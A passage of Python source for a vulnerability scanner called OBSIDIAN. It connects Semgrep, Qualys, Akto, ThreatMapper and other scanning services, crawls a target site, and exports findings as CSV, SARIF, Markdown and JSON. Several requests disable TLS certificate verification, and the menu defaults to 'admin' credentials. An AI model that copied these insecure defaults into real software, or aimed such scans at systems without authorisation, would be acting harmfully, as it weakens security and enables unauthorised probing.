                    (src_dir / f"external_{j}.js").write_text(jr.text)
                    js_files_saved += 1
            except Exception: pass

    except Exception as e:
        logger.log("SEMGREP", f"Source extraction error: {e}", "ERROR")
        return findings

    if js_files_saved == 0:
        logger.log("SEMGREP", "No JS source files found to analyse", "WARNING")
        return findings

    logger.log("SEMGREP", f"Analysing {js_files_saved} JS files …")

    out_json = workdir / "semgrep_out.json"
    run_cmd([
        "semgrep",
        "--config", "p/security-audit",   # security audit ruleset
        "--config", "p/javascript",       # JS-specific rules
        "--config", "p/nodejs",           # Node.js rules
        "--config", "p/owasp-top-ten",    # OWASP Top 10 rules
        "--json",
        "--output",     str(out_json),
        "--no-git-ignore",
        "--quiet",
        str(src_dir),
    ], timeout=120)

    SEV_MAP = {"ERROR":"High","WARNING":"Medium","INFO":"Low"}

    if out_json.exists():
        try:
            data = json.loads(out_json.read_text(errors="ignore"))
            seen = set()
            for result in data.get("results",[]):
                rule_id  = result.get("check_id","")
                msg      = result.get("extra",{}).get("message","")
                sev_raw  = result.get("extra",{}).get("severity","WARNING")
                sev      = SEV_MAP.get(sev_raw,"Low")
                path     = result.get("path","")
                start_ln = result.get("start",{}).get("line",0)
                lines_ctx= result.get("extra",{}).get("lines","")
                cwe      = result.get("extra",{}).get("metadata",{}).get("cwe","")
                owasp    = result.get("extra",{}).get("metadata",{}).get("owasp","")

                dedup = f"{rule_id}:{path}:{start_ln}"
                if dedup in seen: continue
                seen.add(dedup)

                logger.log("SEMGREP", f"[{sev}] {rule_id} in {path}:{start_ln}", "WARNING")
                findings.append(make_finding("secrets" if "secret" in rule_id.lower()
                                              else "xss" if "xss" in rule_id.lower()
                                              else "sqli" if "sql" in rule_id.lower()
                                              else "info_disclosure",
                    f"Semgrep [{rule_id}]", sev,
                    f"{msg}. File: {path} line {start_ln}. "
                    f"Code: {lines_ctx[:100]}. OWASP: {owasp}.",
                    "Review and remediate the flagged code pattern.",
                    url=target, tool="semgrep",
                    cwe=cwe, evidence=f"rule={rule_id}, file={path}:{start_ln}"))

        except Exception as e:
            logger.log("SEMGREP", f"JSON parse error: {e}", "ERROR")

    logger.log("SEMGREP", f"SAST complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# QUALYS WAS — REST API
# ─────────────────────────────────────────────────────────────────────────────
def tool_qualys(target, workdir, qualys_user="", qualys_pass="",
                platform="qualysapi.qg2.apps.qualys.com"):
    """
    Qualys Web Application Scanning (WAS) REST API.
    Requires Qualys subscription with WAS module.
    """
    findings = []
    logger.log("QUALYS", f"Qualys WAS: {target}", "TOOL")

    if not qualys_user or not qualys_pass:
        logger.log("QUALYS", "Qualys credentials required: --qualys-user / --qualys-pass", "WARNING")
        return findings

    import requests as _rq
    from requests.auth import HTTPBasicAuth

    base = f"https://{platform}/qps/rest/3.0"
    auth = HTTPBasicAuth(qualys_user, qualys_pass)
    headers = {"Content-Type":"application/xml", "Accept":"application/json"}

    def q_post(path, xml_body):
        try:
            r = _rq.post(f"{base}{path}", data=xml_body, auth=auth,
                         headers=headers, timeout=30, verify=False)
            return r.json() if r.status_code == 200 else None
        except Exception: return None

    def q_get(path):
        try:
            r = _rq.get(f"{base}{path}", auth=auth, headers=headers, timeout=30, verify=False)
            return r.json() if r.status_code == 200 else None
        except Exception: return None

    # Create web app
    domain = get_domain(target)
    create_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
    <ServiceRequest>
      <data><WebApp>
        <name>DD-Qualys-{domain[:20]}</name>
        <url>{target}</url>
      </WebApp></data>
    </ServiceRequest>"""

    wa_resp = q_post("/create/was/webapp", create_xml)
    if not wa_resp:
        logger.log("QUALYS", "Failed to create web app in Qualys", "ERROR")
        return findings

    wa_id = str(wa_resp.get("ServiceResponse",{})
                .get("data",{}).get("WebApp",{}).get("id",""))

    # Launch scan
    scan_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
    <ServiceRequest>
      <data><WasScan>
        <name>DD-Qualys-Scan-{domain[:15]}</name>
        <type>VULNERABILITY</type>
        <target><webApp><id>{wa_id}</id></webApp></target>
        <profile><id>11000001</id></profile>
      </WasScan></data>
    </ServiceRequest>"""

    scan_resp = q_post("/create/was/wasscan", scan_xml)
    if not scan_resp: return findings

    scan_id = str(scan_resp.get("ServiceResponse",{})
                  .get("data",{}).get("WasScan",{}).get("id",""))
    logger.log("QUALYS", f"Qualys scan launched: {scan_id}")

    # Poll for completion (max 45 min)
    for _ in range(270):
        time.sleep(10)
        status = q_get(f"/get/was/wasscan/{scan_id}")
        if status:
            st = (status.get("ServiceResponse",{})
                  .get("data",{}).get("WasScan",{}).get("status",""))
            if st == "FINISHED": break

    # Get results
    results = q_get(f"/search/was/finding/?scan.id={scan_id}")
    if not results: return findings

    SEV_MAP = {1:"Info",2:"Low",3:"Medium",4:"High",5:"Critical"}
    for finding in results.get("ServiceResponse",{}).get("data",[]):
        f_data = finding.get("Finding",{})
        name   = f_data.get("name","")
        sev_id = f_data.get("severity",1)
        sev    = SEV_MAP.get(sev_id,"Low")
        url    = f_data.get("url",target)
        desc   = f_data.get("description","")
        param  = f_data.get("param","")
        qid    = f_data.get("qid","")

        if sev == "Info": continue
        logger.log("QUALYS", f"[{sev}] {name[:60]}", "WARNING")
        findings.append(make_finding("info_disclosure",
            f"Qualys WAS: {name}", sev,
            f"{desc[:200]}. Param: {param}. QID: {qid}.",
            "Remediate per Qualys guidance.",
            url=url, tool="qualys",
            evidence=f"qid={qid}, param={param}"))

    logger.log("QUALYS", f"Complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# AKTO — API Security Testing Platform
# ─────────────────────────────────────────────────────────────────────────────
def tool_akto(target, workdir, akto_url="http://localhost:9090", api_key=""):
    """
    Akto API Security Testing — REST API integration.
    Start Akto: docker run -d -p 9090:9090 aktosecurity/akto
    """
    findings = []
    logger.log("AKTO", f"Akto API scan: {target}", "TOOL")

    if not api_key:
        logger.log("AKTO", "Akto API key required: --akto-key <key>", "WARNING")
        return findings

    import requests as _rq
    sess = _rq.Session()
    sess.headers.update({"X-API-KEY": api_key, "Content-Type":"application/json"})
    base = akto_url.rstrip("/")

    try:
        # Check connection
        health = sess.get(f"{base}/api/health", timeout=10)
        if health.status_code != 200:
            logger.log("AKTO", "Cannot connect to Akto", "WARNING")
            return findings

        # Create API collection from target
        coll = sess.post(f"{base}/api/collections",
            json={"name":f"DD-{get_domain(target)[:15]}", "type":"API"}, timeout=15)

        if coll.status_code not in (200,201): return findings
        coll_id = coll.json().get("id","")

        # Run security tests
        test = sess.post(f"{base}/api/tests/start",
            json={"collectionId": coll_id,
                  "testingRunType": "ONE_TIME",
                  "selectedTests":["BOLA","BROKEN_AUTH","BFLA","EXCESSIVE_DATA",
                                   "INJECTION","SSRF","JWT","RATE_LIMIT"]}, timeout=15)

        if test.status_code not in (200,201): return findings
        test_id = test.json().get("testingRunId","")

        # Poll for completion
        for _ in range(60):
            time.sleep(5)
            status = sess.get(f"{base}/api/tests/{test_id}/status", timeout=10)
            if status.status_code == 200:
                if status.json().get("state","") in ("COMPLETED","FAILED"): break

        # Get results
        results = sess.get(f"{base}/api/tests/{test_id}/results", timeout=30)
        if results.status_code != 200: return findings

        SEV_MAP = {"HIGH":"High","MEDIUM":"Medium","LOW":"Low","INFO":"Info"}
        for vuln in results.json().get("vulnerabilities",[]):
            name = vuln.get("name","")
            sev  = SEV_MAP.get(vuln.get("severity","LOW").upper(),"Low")
            desc = vuln.get("description","")
            api  = vuln.get("apiEndpoint","")

            if sev == "Info": continue
            logger.log("AKTO", f"[{sev}] {name[:60]}", "WARNING")
            findings.append(make_finding("api_bfla" if "BOLA" in name or "BFLA" in name
                                          else "info_disclosure",
                f"Akto: {name}", sev,
                f"{desc[:200]}. Endpoint: {api}.",
                "Remediate per Akto security test guidance.",
                url=api or target, tool="akto"))

    except Exception as e:
        logger.log("AKTO", f"API error: {e}", "ERROR")

    logger.log("AKTO", f"Complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# THREATMAPPER — REST API
# ─────────────────────────────────────────────────────────────────────────────
def tool_threatmapper(target, workdir, tm_url="http://localhost:9992",
                      api_key=""):
    """
    ThreatMapper (Deepfence) — cloud-native threat detection platform.
    Start: docker-compose -f deepfence_cloud.yml up
    """
    findings = []
    logger.log("THREATMAP", f"ThreatMapper: {target}", "TOOL")

    if not api_key:
        logger.log("THREATMAP", "ThreatMapper API key required: --threatmapper-key <key>", "WARNING")
        return findings

    import requests as _rq
    sess = _rq.Session()
    sess.headers.update({"Authorization":f"Bearer {api_key}","Content-Type":"application/json"})
    sess.verify = False
    base = tm_url.rstrip("/")

    try:
        auth = sess.post(f"{base}/deepfence/v1/user/auth",
            json={"api_token": api_key}, timeout=15)
        if auth.status_code != 200:
            logger.log("THREATMAP", "Authentication failed", "WARNING")
            return findings

        access_token = auth.json().get("access_token","")
        sess.headers["Authorization"] = f"Bearer {access_token}"

        # Start vulnerability scan
        scan = sess.post(f"{base}/deepfence/v1/scans/vulnerability",
            json={"node_type":"host","node_ids":[get_domain(target)],
                  "scan_type":"base","is_priority":True}, timeout=15)

        if scan.status_code not in (200,201): return findings
        scan_id = scan.json().get("scan_id","")

        # Poll
        for _ in range(60):
            time.sleep(10)
            status = sess.get(f"{base}/deepfence/v1/scans/{scan_id}", timeout=10)
            if status.status_code == 200:
                if status.json().get("status","") in ("COMPLETE","ERROR"): break

        # Get vulnerabilities
        vulns = sess.get(f"{base}/deepfence/v1/scans/{scan_id}/vulnerabilities", timeout=30)
        if vulns.status_code != 200: return findings

        SEV_MAP = {"critical":"Critical","high":"High","medium":"Medium","low":"Low"}
        for vuln in vulns.json().get("vulnerabilities",[]):
            cve_id = vuln.get("cve_id","")
            sev    = SEV_MAP.get(vuln.get("cve_severity","low").lower(),"Low")
            desc   = vuln.get("cve_description","")
            cvss   = vuln.get("cve_cvss_score",0)
            pkg    = vuln.get("cve_affected_package","")

            if sev == "Low": continue
            logger.log("THREATMAP", f"[{sev}] {cve_id}: {desc[:50]}", "WARNING")
            findings.append(make_finding("recon",
                f"ThreatMapper: {cve_id}", sev,
                f"{desc[:200]}. Package: {pkg}. CVSS: {cvss}.",
                "Update affected package. Apply vendor patch.",
                url=target, tool="threatmapper",
                cwe=cve_id, evidence=f"cvss={cvss}, pkg={pkg}"))

    except Exception as e:
        logger.log("THREATMAP", f"API error: {e}", "ERROR")

    logger.log("THREATMAP", f"Complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# VULNVAS — Vulnerability assessment integration
# ─────────────────────────────────────────────────────────────────────────────
def tool_vulnvas(target, workdir, vulnvas_url="http://localhost:8080", api_key=""):
    """VulnVAS — vulnerability assessment service integration."""
    findings = []
    logger.log("VULNVAS", f"VulnVAS: {target}", "TOOL")

    if not api_key:
        logger.log("VULNVAS", "VulnVAS API key required: --vulnvas-key <key>", "WARNING")
        return findings

    import requests as _rq
    sess = _rq.Session()
    sess.headers["Authorization"] = f"Bearer {api_key}"
    base = vulnvas_url.rstrip("/")

    try:
        # Health check
        h = sess.get(f"{base}/api/health", timeout=10)
        if h.status_code != 200:
            logger.log("VULNVAS", "Cannot connect to VulnVAS", "WARNING")
            return findings

        # Submit scan
        r = sess.post(f"{base}/api/scan",
            json={"target": target, "scan_type": "full", "timeout": 1800},
            timeout=20)
        if r.status_code not in (200,201): return findings
        scan_id = r.json().get("scan_id","")

        # Poll
        for _ in range(180):
            time.sleep(10)
            st = sess.get(f"{base}/api/scan/{scan_id}", timeout=10)
            if st.status_code == 200:
                if st.json().get("status","") in ("completed","failed"): break

        # Get results
        res = sess.get(f"{base}/api/scan/{scan_id}/results", timeout=30)
        if res.status_code != 200: return findings

        for v in res.json().get("vulnerabilities",[]):
            name = v.get("name","")
            sev  = v.get("severity","Low").capitalize()
            desc = v.get("description","")
            url  = v.get("affected_url", target)

            findings.append(make_finding("info_disclosure",
                f"VulnVAS: {name}", sev,
                f"{desc[:200]}.",
                "Remediate per VulnVAS guidance.",
                url=url, tool="vulnvas"))

    except Exception as e:
        logger.log("VULNVAS", f"API error: {e}", "ERROR")

    logger.log("VULNVAS", f"Complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# ENTERPRISE TOOL MENU — Interactive setup and launch
# ─────────────────────────────────────────────────────────────────────────────
ENTERPRISE_TOOLS = [
    ("OWASP ZAP",       "zaproxy",   "Full active+passive+AJAX scan via REST API",    "localhost:8080"),
    ("OpenVAS/GVM",     "openvas",   "Comprehensive network vuln scan",               "localhost:9390"),
    ("Nessus",          "nessus",    "Tenable Nessus — industry standard",            "localhost:8834"),
    ("Tenable.io",      "tenable",   "Tenable cloud platform",                        "cloud.tenable.com"),
    ("Acunetix",        "acunetix",  "Web app vulnerability scanner",                 "localhost:3443"),
    ("Burp Suite",      "burp",      "Web security testing platform REST API",        "localhost:1337"),
    ("Akto",            "akto",      "API security testing platform",                 "localhost:9090"),
    ("ThreatMapper",    "threatmap", "Cloud-native threat detection",                 "localhost:9992"),
    ("Qualys WAS",      "qualys",    "Enterprise web app scanning",                   "qualysapi.qg2.apps.qualys.com"),
    ("Semgrep SAST",    "semgrep",   "Static analysis on extracted JS source",        "local"),
    ("VulnVAS",         "vulnvas",   "Vulnerability assessment service",              "localhost:8080"),
    ("Nmap v8",         "nmap",      "50+ NSE scripts, OS detect, 6 scan modes",     "local"),
    ("Nuclei v8",       "nuclei",    "FUZZ+DAST mode, custom templates",              "local"),
    ("Nikto v8",        "nikto",     "All plugins + mutation testing",                "local"),
    ("SSLyze v8",       "sslyze",    "Full cipher + cert chain analysis",             "local"),
]

def enterprise_tool_mode():
    """Interactive enterprise tool launcher."""
    clr()
    show_banner()
    menu_title("☠  ENTERPRISE TOOL MODE  v8.0")

    print(f"  {C.PUR}Available enterprise integrations:{C.RST}\n")
    for i, (name, key, desc, host) in enumerate(ENTERPRISE_TOOLS, 1):
        installed_mark = C.GRN + "●" if cmd_exists(key) or key in ("nmap","nuclei","nikto","sslyze","semgrep") else C.RED + "○"
        print(f"  {installed_mark}{C.RST}  {i:>2}. {C.WHT}{name:<18}{C.RST} {C.DIM}{desc}{C.RST}")
        print(f"           {C.DIM}Host: {host}{C.RST}")

    print(f"\n  {C.DIM}Enter tool number to configure + launch, or 'all' to run all available, or 'back'{C.RST}")
    print(f"  {C.DIM}API-based tools (ZAP, Nessus, Burp etc) will prompt for connection details{C.RST}\n")

    target = prompt("Target URL/IP")
    if not target: return

    choice = prompt("Tool # (or 'all')")

    WORK_DIR.mkdir(exist_ok=True)
    session = make_session()
    all_findings = []

    def run_enterprise(key, target):
        configs = {}
        if key == "nmap":
            mode = prompt("Nmap mode (quick/full/vuln/stealth/aggressive/udp)") or "full"
            return tool_nmap_v8(target, WORK_DIR, scan_mode=mode)
        elif key == "nuclei":
            custom = prompt("Custom templates dir (leave blank for default)") or None
            return tool_nuclei_v8([target], WORK_DIR, custom)
        elif key == "nikto":
            return tool_nikto_v8(target, WORK_DIR)
        elif key == "sslyze":
            return tool_sslyze_v8(target, WORK_DIR)
        elif key == "semgrep":
            return tool_semgrep(target, WORK_DIR, session)
        elif key == "zaproxy":
            zap_url = prompt("ZAP URL") or "http://localhost:8080"
            zap_key = prompt("ZAP API key (blank=none)") or ""
            return tool_owasp_zap(target, WORK_DIR, zap_url, zap_key)
        elif key == "openvas":
            h = prompt("OpenVAS host") or "localhost"
            u = prompt("Username") or "admin"
            p = prompt("Password", color=C.RED) or "admin"
            return tool_openvas(target, WORK_DIR, h, 9390, u, p)
        elif key == "nessus":
            h    = prompt("Nessus host") or "localhost"
            ak   = prompt("Access key (or leave blank for user/pass)") or ""
            sk   = prompt("Secret key") or "" if ak else ""
            u    = prompt("Username") or "admin" if not ak else ""
            p    = prompt("Password", color=C.RED) or "admin" if not ak else ""
            cloud= prompt("Tenable.io cloud? (y/n)") or "n"
            return tool_nessus(target, WORK_DIR, h, 8834, u, p, ak, sk, cloud=="y")
        elif key == "acunetix":
            url = prompt("Acunetix URL") or "https://localhost:3443"
            k   = prompt("API key") or ""
            return tool_acunetix(target, WORK_DIR, url, k)
        elif key == "burp":
            url = prompt("Burp URL") or "http://localhost:1337"
            k   = prompt("API key") or ""
            return tool_burpsuite(target, WORK_DIR, url, k)
        elif key == "akto":
            url = prompt("Akto URL") or "http://localhost:9090"
            k   = prompt("API key") or ""
            return tool_akto(target, WORK_DIR, url, k)
        elif key == "threatmap":
            url = prompt("ThreatMapper URL") or "http://localhost:9992"
            k   = prompt("API key") or ""
            return tool_threatmapper(target, WORK_DIR, url, k)
        elif key == "qualys":
            u = prompt("Qualys username") or ""
            p = prompt("Qualys password", color=C.RED) or ""
            return tool_qualys(target, WORK_DIR, u, p)
        elif key == "vulnvas":
            url = prompt("VulnVAS URL") or "http://localhost:8080"
            k   = prompt("API key") or ""
            return tool_vulnvas(target, WORK_DIR, url, k)
        elif key == "tenable":
            ak = prompt("Tenable access key") or ""
            sk = prompt("Tenable secret key") or ""
            return tool_nessus(target, WORK_DIR, access_key=ak, secret_key=sk, use_cloud=True)
        return []

    if choice.lower() == "all":
        for name, key, desc, host in ENTERPRISE_TOOLS:
            print(f"\n  {C.PUR}Running: {name}{C.RST}")
            try:
                new_f = run_enterprise(key, target)
                all_findings.extend(new_f)
                print(f"  {C.GRN}✔ {name}: {len(new_f)} findings{C.RST}")
            except Exception as e:
                print(f"  {C.RED}✗ {name}: {e}{C.RST}")
    else:
        try:
            idx = int(choice) - 1
            name, key, desc, host = ENTERPRISE_TOOLS[idx]
            print(f"\n  {C.PUR}Configuring {name} …{C.RST}")
            all_findings = run_enterprise(key, target)
        except (ValueError, IndexError):
            print(f"  {C.RED}Invalid selection{C.RST}")
            return

    if all_findings:
        store = FindingStore()
        store.extend(all_findings)
        out = str(WORK_DIR / f"enterprise_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        meta = {"start": datetime.now().isoformat(), "end": datetime.now().isoformat(), "duration": 0}
        save_json_report(target, store, meta, out)
        print_final_summary(store, target, datetime.now(), 0)
        print(f"\n  {C.GRN}Report saved: {out}{C.RST}")



def crawl_internal(target, session):
    """Internal spider - extracts parameterised URLs."""
    logger.log("CRAWLER", "Internal spider ...")
    visited, with_params, queue = set(), [], [target]
    base = urlparse(target).netloc
    while queue and len(visited) < MAX_CRAWL:
        url = queue.pop(0)
        if url in visited: continue
        visited.add(url)
        resp = safe_get(session, url)
        if not resp: continue
        try:
            if urlparse(url).query:
                with_params.append(url)
            body = resp.text
            # Extract all href/src/action values using split approach
            for attr in ['href=', 'src=', 'action=']:
                parts = body.split(attr)
                for part in parts[1:]:
                    part = part.strip()
                    if not part: continue
                    quote = part[0] if part[0] in ('"', "'") else None
                    if quote:
                        end = part.find(quote, 1)
                        lnk = part[1:end] if end > 0 else ""
                    else:
                        end = part.find(' ')
                        lnk = part[:end] if end > 0 else part[:100]
                    lnk = lnk.strip()
                    if not lnk or lnk.startswith(('javascript:', 'mailto:', '#')): continue
                    full = urljoin(url, lnk)
                    p    = urlparse(full)
                    if p.netloc == base and full not in visited:
                        if p.query: with_params.append(full)
                        if len(queue) < MAX_CRAWL * 3: queue.append(full)
        except Exception:
            pass
    result = list(dict.fromkeys(with_params))[:MAX_CRAWL]
    logger.log("CRAWLER", f"Found {len(result)} parameterised URLs", "SUCCESS")
    return result


# Ensure TOOL_NAME is always available (belt-and-suspenders guard)
_TOOL_NAME = "OBSIDIAN"


TOOL_NAME = "OBSIDIAN"  # Guard: ensure always defined


# ─────────────────────────────────────────────────────────────────────────────
# OUTPUT FORMAT WRITERS — CSV / SARIF / MARKDOWN / DIFF
# ─────────────────────────────────────────────────────────────────────────────

def save_csv_report(target, store, meta, path,
                    tool_name="OBSIDIAN"):
    """Export findings as CSV — importable in Excel/Google Sheets/Jira."""
    import csv
    findings = store.all()
    fieldnames = [
        "severity","cvss_score","cvss_vector","title","module",
        "owasp_id","owasp_name","mitre_id","mitre_technique",
        "cwe","confidence","url","payload","description",
        "recommendation","tool","evidence","timestamp"
    ]
    with open(path, "w", newline="", encoding="utf-8") as fh:
        writer = csv.DictWriter(fh, fieldnames=fieldnames, extrasaction="ignore")
        writer.writeheader()
        for f in findings:
            row = f.to_dict()
            row["cvss_score"]  = getattr(f, "cvss_score",  "")
            row["cvss_vector"] = getattr(f, "cvss_vector", "")
            writer.writerow({k: row.get(k,"") for k in fieldnames})
    logger.log("REPORT", f"CSV  → {path}", "SUCCESS")
    return path


def save_sarif_report(target, store, meta, path,
                      tool_name="OBSIDIAN"):
    """
    Export findings in SARIF 2.1.0 format.
    SARIF is consumed by GitHub Advanced Security, VS Code, Azure DevOps,
    and most CI/CD security pipelines.
    """
    SEV_MAP = {
        "Critical": "error",
        "High":     "error",
        "Medium":   "warning",
        "Low":      "note",
        "Info":     "none",
    }
    rules   = {}
    results = []

    for f in store.all():
        rule_id = f.module or "unknown"
        if rule_id not in rules:
            cvss_score  = getattr(f, "cvss_score",  "")
            cvss_vector = getattr(f, "cvss_vector", "")
            rules[rule_id] = {
                "id": rule_id,
                "name": f.title,
                "shortDescription": {"text": f.title},
                "fullDescription":  {"text": f.description},
                "helpUri": f"https://owasp.org/www-project-top-ten/",
                "properties": {
                    "owasp":       f.owasp_id,
                    "mitre":       f.mitre_id,
                    "cwe":         f.cwe,
                    "cvss_score":  str(cvss_score),
                    "cvss_vector": cvss_vector,
                },
                "defaultConfiguration": {
                    "level": SEV_MAP.get(f.severity, "note")
                },
            }

        location = {
            "physicalLocation": {
                "artifactLocation": {"uri": f.url or target},
                "region":           {"startLine": 1},
            },
            "logicalLocations": [
                {"name": f.module, "kind": "module"}
            ],
        }
        result = {
            "ruleId":   rule_id,
            "level":    SEV_MAP.get(f.severity, "note"),
            "message":  {"text": f"{f.description} | Fix: {f.recommendation}"},
            "locations":[location],
            "properties": {
                "confidence": f.confidence,
                "payload":    f.payload,
                "evidence":   getattr(f, "evidence", ""),
                "cvss_score": str(getattr(f, "cvss_score", "")),
                "timestamp":  f.timestamp,
            },
        }
        if f.payload:
            result["relatedLocations"] = [
                {"message": {"text": f"Payload: {f.payload[:200]}"}}
            ]
        results.append(result)

    sarif = {
        "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {
                "driver": {
                    "name":            tool_name,
                    "version":         VERSION,
                    "informationUri":  "https://github.com/darkdevil/scanner",
                    "rules":           list(rules.values()),
                }
            },
            "results":   results,
            "invocations": [{
                "commandLine":       f"obsidian_core.py -u {target}",
                "startTimeUtc":      meta["start"],
                "endTimeUtc":        meta["end"],
                "executionSuccessful": True,
            }],
            "properties": {
                "target":     target,
                "risk_score": store.risk_score(),
                "findings":   len(store.all()),
            },
        }],
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(sarif, fh, indent=2, ensure_ascii=False)
    logger.log("REPORT", f"SARIF→ {path}", "SUCCESS")
    return path


def save_markdown_report(target, store, meta, path,
                         tool_name="OBSIDIAN"):
    """Export findings as GitHub-flavoured Markdown report."""
    counts = store.counts()
    risk   = store.risk_score()
    dur    = meta.get("duration", "?")

    SEV_EMOJI = {
        "Critical": "🔴",
        "High":     "🟠",
        "Medium":   "🟡",
        "Low":      "🟢",
        "Info":     "⚪",
    }

    lines = [
        f"# ☠ OBSIDIAN v{VERSION} — Security Report",
        f"",
        f"| Field | Value |",
        f"|---|---|",
        f"| **Target** | `{target}` |",
        f"| **Scan Date** | {meta['start'][:19].replace('T',' ')} |",
        f"| **Duration** | {dur}s |",
        f"| **Risk Score** | {risk}/100 |",
        f"| **Total Findings** | {len(store.all())} |",
        f"",
        f"## Summary",
        f"",
        f"| Severity | Count |",
        f"|---|---|",
    ]
    for sev in ["Critical","High","Medium","Low","Info"]:
        c = counts.get(sev, 0)
        if c:
            lines.append(f"| {SEV_EMOJI[sev]} {sev} | {c} |")

    lines += ["", "## Findings", ""]

    for f in store.all():
        emoji = SEV_EMOJI.get(f.severity, "⚪")
        cvss  = getattr(f, "cvss_score", "")
        cvss_str = f" | CVSS: **{cvss}**" if cvss else ""
        lines += [
            f"### {emoji} {f.title}",
            f"",
            f"| Field | Value |",
            f"|---|---|",
            f"| **Severity** | {f.severity}{cvss_str} |",
            f"| **CVSS Vector** | `{getattr(f,'cvss_vector','')}` |",
            f"| **OWASP** | {f.owasp_id} — {f.owasp_name} |",
            f"| **MITRE** | {f.mitre_id} — {f.mitre_technique} |",
            f"| **CWE** | {f.cwe} |",
            f"| **Confidence** | {f.confidence} |",
            f"| **Tool** | {f.tool} |",
            f"| **URL** | `{f.url}` |",
            f"",
            f"**Description:** {f.description}",
            f"",
            f"**Payload:**",
            f"```",
            f"{f.payload or 'N/A'}",
            f"```",
            f"",
            f"> **Fix:** {f.recommendation}",
            f"",
            f"---",
            f"",
        ]

    lines += [
        f"",
        f"---",
        f"*Generated by {tool_name} v{VERSION} | OWASP Web+API Top 10 | MITRE ATT&CK | Zero-FP Architecture*",
    ]

    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines))
    logger.log("REPORT", f"MD   → {path}", "SUCCESS")
    return path


def diff_reports(old_path: str, new_path: str) -> dict:
    """
    Compare two scan JSON reports and return a delta:
    - new_findings:     appeared in new scan, not in old
    - fixed_findings:   appeared in old scan, not in new (remediated)
    - unchanged:        same in both
    - risk_delta:       change in risk score
    """
    try:
        with open(old_path) as f: old = json.load(f)
        with open(new_path) as f: new = json.load(f)
    except Exception as e:
        logger.log("DIFF", f"Error loading reports: {e}", "ERROR")
        return {}

    def fingerprint(finding: dict) -> str:
        return f"{finding.get('module','')}:{finding.get('title','')}:{finding.get('url','')}"

    old_fps = {fingerprint(f): f for f in old.get("findings", [])}
    new_fps = {fingerprint(f): f for f in new.get("findings", [])}

    new_findings   = [new_fps[k] for k in new_fps if k not in old_fps]
    fixed_findings = [old_fps[k] for k in old_fps if k not in new_fps]
    unchanged      = [new_fps[k] for k in new_fps if k in old_fps]

    old_risk = old.get("meta", {}).get("risk_score", 0)
    new_risk = new.get("meta", {}).get("risk_score", 0)

    delta = {
        "old_target":       old.get("meta", {}).get("target",""),
        "new_target":       new.get("meta", {}).get("target",""),
        "old_scan":         old.get("meta", {}).get("scan_start",""),
        "new_scan":         new.get("meta", {}).get("scan_start",""),
        "risk_old":         old_risk,
        "risk_new":         new_risk,
        "risk_delta":       new_risk - old_risk,
        "new_findings":     new_findings,
        "fixed_findings":   fixed_findings,
        "unchanged":        unchanged,
        "new_count":        len(new_findings),
        "fixed_count":      len(fixed_findings),
        "unchanged_count":  len(unchanged),
    }

    print()
    pulse_line("☠  SCAN DIFF REPORT  ☠", C.PUR)
    print(f"  {C.WHT}Old scan : {C.DIM}{delta['old_scan'][:19]}{C.RST}")
    print(f"  {C.WHT}New scan : {C.DIM}{delta['new_scan'][:19]}{C.RST}")
    print()
    risk_col = C.RED if delta["risk_delta"] > 0 else C.GRN
    risk_sym = "▲" if delta["risk_delta"] > 0 else "▼" if delta["risk_delta"] < 0 else "="
    print(f"  {C.WHT}Risk     : {C.RST}{old_risk}% → {new_risk}% {risk_col}{risk_sym}{abs(delta['risk_delta'])}%{C.RST}")
    print()
    print(f"  {C.RED}New findings   : {len(new_findings)}{C.RST}")
    for f in new_findings[:10]:
        sev = f.get("severity","?")
        col = C.RED if sev in ("Critical","High") else C.YLW
        print(f"    {col}+ {f.get('title','?')[:65]}{C.RST}")
    print(f"  {C.GRN}Fixed findings : {len(fixed_findings)}{C.RST}")
    for f in fixed_findings[:10]:
        print(f"    {C.GRN}- {f.get('title','?')[:65]}{C.RST}")
    print(f"  {C.DIM}Unchanged      : {len(unchanged)}{C.RST}")
    print()

    return delta


def save_json_report(target,store,meta,path,tool_name="OBSIDIAN"):
    counts=store.counts()
    # Group by OWASP
    owasp_groups={}
    for f in store.all():
        key=f.owasp_id or "Other"
        owasp_groups.setdefault(key,[]).append(f.to_dict())
    data={
        "meta":{"tool":tool_name,"version":VERSION,"target":target,
                "scan_start":meta["start"],"scan_end":meta["end"],
                "duration_seconds":meta["duration"],
                "risk_score":store.risk_score(),"total_findings":len(store.all()),
                "platform":platform.system()},
        "summary":counts,
        "owasp_breakdown":{k:len(v) for k,v in owasp_groups.items()},
        "mitre_breakdown":{f.mitre_id: f.mitre_technique
                           for f in store.all() if f.mitre_id},
        "owasp_api_breakdown":{k:len(v) for k,v in
                               {f.owasp_id:[x for x in store.all()
                                if x.owasp_id==f.owasp_id]
                                for f in store.all()
                                if f.owasp_id and f.owasp_id.startswith("API")
                               }.items()},
        "findings":[{**f.to_dict(),
                             "cvss_score": getattr(f,"cvss_score",""),
                             "cvss_vector": getattr(f,"cvss_vector",""),
                             "cvss_rating": getattr(f,"cvss_rating","")}
                            for f in store.all()],
        "raw_log":logger.entries,
    }
    with open(path,"w",encoding="utf-8") as fh: json.dump(data,fh,indent=2,ensure_ascii=False)
    logger.log("REPORT",f"JSON → {path}","SUCCESS"); return path

def save_html_report(target,store,meta,path,tool_name="OBSIDIAN"):
    counts=store.counts(); risk=store.risk_score()
    SC={"Critical":"#e74c3c","High":"#e67e22","Medium":"#f1c40f","Low":"#2ecc71","Info":"#9b59b6"}
    def badge(s): c=SC.get(s,"#999"); return f'<span style="background:{c};color:#000;padding:2px 8px;border-radius:3px;font-weight:bold;font-size:.78rem">{s}</span>'

    rows=""
    for f in store.all():
        cvss_s  = getattr(f,"cvss_score","")
        cvss_bg = ("#b71c1c" if cvss_s and float(str(cvss_s) or 0)>=9 else
